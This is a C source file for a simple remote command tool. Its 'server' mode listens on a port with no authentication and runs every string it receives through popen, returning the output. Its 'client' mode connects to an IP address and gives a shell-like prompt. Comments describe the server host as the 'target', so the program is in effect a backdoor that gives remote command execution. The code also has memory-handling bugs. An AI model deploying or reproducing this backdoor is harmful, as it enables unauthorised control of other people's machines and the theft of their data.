#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <memory.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>

#define MSG_CHUNK 0x200       // Buffer size.

// flags for get stream data function.
#define READ_LINE 0x1
#define READ_ALL  0x2

static int sendall(int sock_fd, const char *msg)
{
    // TODO - send the messaue by broke it into sagments.   
    size_t msg_size = strlen(msg);
    size_t bytes_left = msg_size; // bytes left.
    size_t chunk_size = 0;

    int pos = 0;
    
    // Send the data.
    while (bytes_left) {
         chunk_size = (MSG_CHUNK < bytes_left)? MSG_CHUNK : bytes_left;
         chunk_size = send(sock_fd, msg + pos, chunk_size, MSG_NOSIGNAL);
         if (chunk_size == -1) return -1;
         // caculate the left bytes and the current position.
         bytes_left -= chunk_size;
         pos += chunk_size;
    }
    char buff = '\0';
    if (send(sock_fd, &buff, 1, MSG_NOSIGNAL) == -1) return -1;

    return 0;
}

static int recvall(char **dst, int sock_fd)
{

    size_t s_init_msg = 10;
    (*dst) = (char *) malloc(sizeof(char) * s_init_msg);
    if (*dst == NULL) return -1;
    char ch = ' ';

    int len = 0;
    while (ch != '\0') {
        if (recv(sock_fd, &ch, 1, 0) == -1) return -1;
        (*dst)[len] = ch;
        
        ++len;
        if (len == s_init_msg) {
            s_init_msg += 10;
            (*dst) = (char *) realloc(*dst, sizeof(char) * s_init_msg);
            if (*dst == NULL) return -1;
        }
    }
    (*dst)[len] = '\0';

    (*dst) = (char *) realloc(*dst, sizeof(char) * len);
    if (*dst == NULL) return -1;
    return 0;
}

static char *get_stream_data(FILE *stream, 
                             size_t init_size, int flag)
{
    char *input = NULL;
    int curr_ch;
    size_t curr_len = 0;

    // Allocate space for init_size characters.
    input = (char *) malloc(sizeof(char) * init_size);
    if (input == NULL) return NULL;

    // TODO - optimize this thing.
    if (flag == READ_ALL) {
        while ((curr_ch = fgetc(stream)) != EOF) {
           input[curr_len++] = curr_ch;
           if (curr_len == init_size) {
               input = (char *) realloc(input, sizeof(char) * 
                                       (init_size += 10));
               if (input == NULL) return NULL;
           }
        }
    } else {
        while ((curr_ch = fgetc(stream)) != EOF 
			   && curr_ch != '\n') {
            input[curr_len++] = curr_ch;
            if (curr_len == init_size) {
                input = (char *) realloc(input, sizeof(char) * 
                                        (init_size += 10));
                if (input == NULL) return NULL;
            }
        }
    }
    
    input[curr_len++] = '\0';

    // Decreace the memory to the exac size of string.
    return (char *) realloc(input, sizeof(char) * curr_len);
}

// executes a command in taget's computer.
static char *execute_command(const char *cmd)
{
    FILE *cmd_stream = NULL;
    // execute the command.
    cmd_stream = popen(cmd, "r");
    if (cmd_stream == NULL) return NULL;
    // read the data of the cmd_out stream.
    char *cmd_out = get_stream_data(cmd_stream, 10, READ_ALL);
    if (cmd_out == NULL) return NULL;

    pclose(cmd_stream); // close stream.
    return cmd_out;
}

static int run_server(const u_short port)
{
    struct sockaddr_in se_addr;
    int se_addr_l = sizeof(se_addr);
    int se_fd; // the server socket.
    int cl_fd; // the client socket.

    // initialize memory for se_addr.
    memset(&se_addr, 0x0, sizeof(se_addr));
    // Get discriptor for the socket.
    se_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (se_fd == -1) return -1;

    se_addr.sin_family      = AF_INET;
    se_addr.sin_addr.s_addr = INADDR_ANY;
    se_addr.sin_port        = htons(port);

    // bind the address and the socket.
    if (bind(se_fd, (struct sockaddr *)&se_addr,
             sizeof(se_addr)) == -1) return -1;

    // listen for connection.
    char *cmd = NULL;
    char *cmd_out = NULL;
    int is_conn_alive = 0;
    while (1) {
        if (listen(se_fd, 3) == -1) continue;

        cl_fd = accept(se_fd, (struct sockaddr *) &se_addr,
                       (socklen_t *) &se_addr_l);
        if (cl_fd == -1) continue;

        // check if the client is dead.
        while (is_conn_alive != -1 
               && errno != EPIPE) {
            // if for some reason we can't recieve packets, close connection.
            if (recvall(&cmd, cl_fd) == -1) break;
            cmd_out = execute_command(cmd);            
            if (cmd_out == NULL) break;             
            // send the output.
            is_conn_alive = sendall(cl_fd, cmd_out);

            free(cmd);
            free(cmd_out);
        }

        close(cl_fd);
        // reset this values to await for the new connection.
        errno = 0;
        is_conn_alive = 0;
    }

    shutdown(se_fd, SHUT_RDWR);
    return 0;
}

static int run_client(const u_short port, 
                      const char *se_addr)
{
    struct sockaddr_in se_sock_addr;
    int cl_fd; // the client socket.

    // initialize memory for se_addr.
    memset(&se_sock_addr, 0x0, sizeof(se_sock_addr));
    cl_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (cl_fd == -1) return -1;

    se_sock_addr.sin_family = AF_INET;
    se_sock_addr.sin_port   = htons(port);

    if (inet_pton(AF_INET, se_addr, 
                  &se_sock_addr.sin_addr) == -1) return -1;

    // connect to the server.
    if (connect(cl_fd, (struct sockaddr *)& se_sock_addr,
                        sizeof(se_sock_addr)) == -1) {
        printf("Connection failed.\n");
        return -1;
    }

    char *input = NULL;
    char *cmd_out = NULL;

    // simulate a shell like prompt.
    while (1) {
        printf("-> ");
        input = get_stream_data(stdin, 10, READ_LINE); // get the user input.
        if (input == NULL) return -1;
        printf("\n");

        // Send the requested command to server ( target ).
        if (sendall(cl_fd, input) == -1) {
            printf("Failed to send the requested command,"
                   "check your connection or restart client and try again\n");
        }
        if (errno == EPIPE || !strcmp(input, "client-close")) {
            free(input);
            break;
        }
        // recieve the output.
        if (recvall(&cmd_out, cl_fd) == -1) {
             printf("Failed to recieve the output of the requested command,"
                    "check your connection or restart client and try again\n");
        }

        printf("%s\n", cmd_out);
        free(input);
        free(cmd_out);
    }

    printf("Connection closed.\n");
    close(cl_fd);
    return 0;
}

int main(int argc, char *argv[])
{
    u_short port; 

    if (argv[1] == NULL) {
        printf("No option.\n");
    } else if (!strcmp(argv[1], "server")) {
        if (!(argv[2] == NULL)) {
            port = atoi(argv[2]);
            if (port == 0 || port < 6000) {
                printf("The port must be an number greater than 6000\n");
                return -1;
            }
        } else {
            printf("Please specify a port.\n");
        }
        // get the socket.
        if (run_server(port) == -1) {
            printf("Failed to start server.\n");
            return -1;
        }

    } else if (!strcmp(argv[1], "client")) {
        char *ip;

        if (!(argv[2] == NULL)) {
            ip = argv[2];

            if (!(argv[3] == NULL)) {
                port = atoi(argv[3]);
                if (port == 0 || port < 6000) {
                    printf("The port must be an number greater than 6000\n");
                    return -1;
                }
            } else {
                printf("Please specify a port.\n");
            }
        } else {
            printf("Please specify an ip address.\n");
            return -1;
        }

        // get the socket.
        if (run_client(port, ip) == -1) {
            printf("Failed to start client.\n");
            return -1;
        }
    } else {
        printf("Unrecognized option.\n");
    }

    return -1;
}
